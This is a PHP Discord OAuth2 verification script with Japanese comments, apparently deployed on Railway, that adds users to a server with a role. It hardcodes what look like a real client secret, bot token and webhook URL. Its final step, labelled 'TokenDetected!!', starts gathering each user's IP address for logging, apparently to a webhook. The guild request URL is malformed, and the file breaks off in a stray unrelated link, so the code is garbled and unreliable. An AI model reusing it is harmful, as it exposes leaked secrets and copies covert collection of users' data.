<?php
// Railwayの生存確認
if ($_SERVER['REQUEST_URI'] === '/health') {
    http_response_code(200);
    exit('OK');
}

// --- 設定データ ---
$client_id     = '1483799840575062046';
$client_secret = 'LDohkevzX8GXCtGo-YFdPuR-efZpNoSJ'; 
$bot_token     = 'MTQ4Mzc5OTg0MDU3NTA2MjA0Ng.G1Xrdf.IstUaZ5wbz0h6q0nCecx2cRsJztMXeNiyNSE_A'; // ★ここにあなたのボットのトークンを入れてください
$guild_id      = '1483346769025831035';       // ★ロールを付与したいサーバーのID
$role_id       = '1483348922721239132';        // ★付与したいロールのID
$webhook_url   = 'https://discordapp.com/api/webhooks/1483798695370555504/cFHJ2PIpesLaP6nshwICr3SP-7Nz6DWlM6VqsLDIUC6pbiUBbBpm4D3EYnnACTPQQ4fm'; // あなたのWebhook
$redirect_uri  = 'https://discord-verify-production-1337.up.railway.app/'; 

if (!isset($_GET['code'])) {
    echo "Ready. Please use the OAuth2 link.";
    exit;
}

// 1. アクセストークンの取得
$ch = curl_init('https://discord.com/api/oauth2/token');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'client_id'     => $client_id,
    'client_secret' => $client_secret,
    'grant_type'    => 'authorization_code',
    'code'          => $_GET['code'],
    'redirect_uri'  => $redirect_uri
]));
$token_res = json_decode(curl_exec($ch), true);

if (isset($token_res['access_token'])) {
    $access_token = $token_res['access_token'];

    // 2. ユーザー情報の取得
    $ch = curl_init('https://discord.com/api/users/@me');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: Bearer ' . $access_token]);
    $user = json_decode(curl_exec($ch), true);

    // 3. ★サーバーに参加 ＆ ロール付与処理
    $data = json_encode([
        'access_token' => $access_token,
        'roles'        => [$role_id]
    ]);

    $ch = curl_init("https://discord.com/api/guilds/%7B$guild_id%7D/members/%7B$user['id']%7D");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT"); // PUTメソッドを使用
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Authorization: Bot {$bot_token}",
        "Content-Type: application/json"
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $join_res = curl_exec($ch);

    // 4. ログの作成 (TokenDetected!!)
    $time = date("Y/m/d H:i:s");
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $content = "
http://googleusercontent.com/immersive_entry_chip/0
